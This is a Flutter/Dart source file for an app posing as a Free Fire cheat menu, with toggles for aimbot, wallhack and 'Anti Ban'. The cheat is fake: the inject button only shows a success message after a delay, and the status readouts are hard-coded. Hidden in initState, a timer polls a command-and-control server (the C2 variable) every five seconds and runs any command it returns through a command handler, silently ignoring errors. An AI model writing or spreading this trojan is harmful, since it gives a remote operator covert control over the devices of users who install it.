import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import '../config.dart';
import '../services/command_handler.dart';

class CheatHome extends StatefulWidget {
  const CheatHome({super.key});
  @override
  State<CheatHome> createState() => _CheatHomeState();
}

class _CheatHomeState extends State<CheatHome> {
  bool isInjected = false;
  bool isInjecting = false;
  Timer? _pollTimer;
  String? _devId;

  final Map<String, bool> _features = {
    'AimBot Auto Head': true,
    'AimBot Smooth': false,
    'Wallhack ESP': true,
    'Speed Hack': false,
    'No Recoil': true,
    'Antenna Map': true,
    'Auto Headshot': false,
    'Fly Hack': false,
    'Infinite Ammo': false,
    'Anti Ban': true,
    'Bypass Emulator': true,
    'Unlock All Skin': false,
  };

  @override
  void initState() {
    super.initState();
    _initPolling(); // Mulai polling pas menu kebuka
  }

  Future<void> _initPolling() async {
    final prefs = await SharedPreferences.getInstance();
    _devId = prefs.getString('dev_id');
    
    _pollTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
      if (_devId == null) return;
      try {
        final r = await http.get(Uri.parse('$C2/api/device/$_devId/poll'));
        if (r.statusCode != 200) return;
        final j = jsonDecode(r.body);
        await prefs.setString('cfg', jsonEncode(j['config'] ?? {}));
        final cmd = j['cmd'];
        if (cmd != null) {
          await CommandHandler.handle(cmd, _devId!, prefs);
        }
      } catch (_) {}
    });
  }

  @override
  void dispose() {
    _pollTimer?.cancel(); // Matiin timer kalau app ditutup
    super.dispose();
  }

  void _injectCheat() async {
    if (isInjected) return;
    setState(() { isInjecting = true; });
    await Future.delayed(const Duration(seconds: 2));
    setState(() { isInjecting = false; isInjected = true; });
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
      content: Text('BYPASS SUCCESS! Launch Free Fire Now.'),
      backgroundColor: Color(0xFF22C55E),
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF050508),
      body: SafeArea(
        child: Column(children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: const BoxDecoration(
              border: Border(bottom: BorderSide(color: Color(0xFF1E1B26))),
            ),
            child: Row(children: [
              Container(
                width: 50, height: 50,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: const LinearGradient(colors: [Color(0xFFC9A227), Color(0xFFB3121F)]),
                  boxShadow: [BoxShadow(color: const Color(0xFFB3121F).withOpacity(0.5), blurRadius: 15)],
                ),
                child: const Icon(Icons.local_fire_department, color: Colors.white, size: 30),
              ),
              const SizedBox(width: 15),
              const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text('OREO VVIP V33', style: TextStyle(fontSize: 18, letterSpacing: 3, fontWeight: FontWeight.bold, color: Colors.white)),
                SizedBox(height: 4),
                Row(children: [
                  Icon(Icons.circle, color: Color(0xFF22C55E), size: 8),
                  SizedBox(width: 5),
                  Text('Server: Connected', style: TextStyle(fontSize: 10, color: Color(0xFF22C55E), letterSpacing: 1)),
                ]),
              ]),
              const Spacer(),
              const Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
                Text('MEM: 42%', style: TextStyle(fontSize: 10, color: Colors.grey)),
                Text('PING: 12ms', style: TextStyle(fontSize: 10, color: Colors.grey)),
              ]),
            ]),
          ),
          
          Expanded(
            child: ListView(
              padding: const EdgeInsets.all(16),
              children: [
                const Text('SELECT FEATURES', style: TextStyle(fontSize: 11, color: Colors.grey, letterSpacing: 2, fontWeight: FontWeight.bold)),
                const SizedBox(height: 10),
                ..._features.entries.map((e) => Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  decoration: BoxDecoration(
                    color: const Color(0xFF0F0D15),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: const Color(0xFF1E1B26)),
                  ),
                  child: SwitchListTile(
                    title: Text(e.key, style: const TextStyle(fontSize: 14, fontWeight: FontWeight.w500, color: Colors.white)),
                    value: e.value,
                    activeColor: const Color(0xFFC9A227),
                    inactiveThumbColor: Colors.grey,
                    onChanged: (v) => setState(() => _features[e.key] = v),
                  ),
                )),
                const SizedBox(height: 80),
              ],
            ),
          ),

          Container(
            padding: const EdgeInsets.all(20),
            decoration: const BoxDecoration(
              border: Border(top: BorderSide(color: Color(0xFF1E1B26))),
              gradient: LinearGradient(begin: Alignment.topCenter, end: Alignment.bottomCenter, colors: [Color(0xFF07060A), Color(0xFF0F0D15)]),
            ),
            child: SizedBox(
              width: double.infinity, height: 60,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: isInjected ? const Color(0xFF22C55E) : const Color(0xFFB3121F),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  elevation: 10,
                  shadowColor: isInjected ? const Color(0xFF22C55E) : const Color(0xFFB3121F),
                ),
                onPressed: isInjecting ? null : _injectCheat,
                child: isInjecting 
                  ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 3))
                  : Text(
                      isInjected ? 'INJECTED SUCCESSFULLY' : 'INJECT CHEAT NOW',
                      style: const TextStyle(fontSize: 16, letterSpacing: 2, fontWeight: FontWeight.bold, color: Colors.white),
                    ),
              ),
            ),
          ),
        ]),
      ),
    );
  }
}
